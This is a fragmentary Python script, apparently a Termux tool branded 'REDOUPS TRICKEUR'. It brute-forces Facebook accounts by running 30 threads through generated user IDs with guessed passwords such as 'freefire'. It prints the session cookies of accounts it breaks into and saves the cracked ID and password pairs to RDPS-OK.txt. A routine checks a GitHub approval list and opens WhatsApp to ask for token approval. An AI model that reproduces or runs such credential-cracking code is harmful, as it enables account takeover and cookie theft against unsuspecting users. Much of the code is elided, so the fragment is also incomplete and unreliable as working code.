...
Thu Jul 13 02:05:47 EAT 2023
           ...
           ☆☆☆ 《  T E R M U X  》 ☆☆☆
    ◦•●◉✿★★★ REDOUPS TRICKEUR♡ T E A M ★★★✿◉●•◦;91m88  Y8 
\033[38;5;46m———————————————————————————————————
\033[38;5;46m[\033[47m\033[1;92m>)\x1b[0m\033[1;97m Author      : Redoupshack(ᗒᗣᗕ)՞
\033[38;5;46m[\033[47m\033[1;92m>)\x1b[0m \033[1;97mFACEBOOK    : Redoupstrickeur 
\033[38;5;46m[\033[47m\033[1;92m>)\x1b[0m \033[1;97mGITHUB      : \033[1;92mRedoupstrickeur
\033[38;5;46m[\033[47m\033[1;92m>)\x1b[0m \033[1;97mVERSION     : 0.1 
...
def ff():
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		for guru in user:
			uid = kode+guru
			pwx = [guru,'freefire','fflover','fLITONing','ffqueen']
			yaari.submit(fcrack,uid,pwx,tl)
	print('[✓] Crack process has been completed')
	print('[?] Idz saved in [ok.txt,cp.txt]')
	input('Press Enter To Go Back To Menu')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[REDOUPSTRICKEUR] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                open('RDPS-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                # print('\033[1;33m[REDOUPSTRICKEUR-CP] '+uid+' | '+ps+'\x1b[1;97m')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mREDOUPSHACKEUR\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
...
def approval():
  ...
  try:
    httpCaht = requests.get('https://github.com/Redoupstrickeur/approve.2.txt.git').text
    if id in httpCaht:
      ...
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+261330940220?text='+tks),approval()
      time.sleep(1)
      approval()
  except:
    sys.exit()
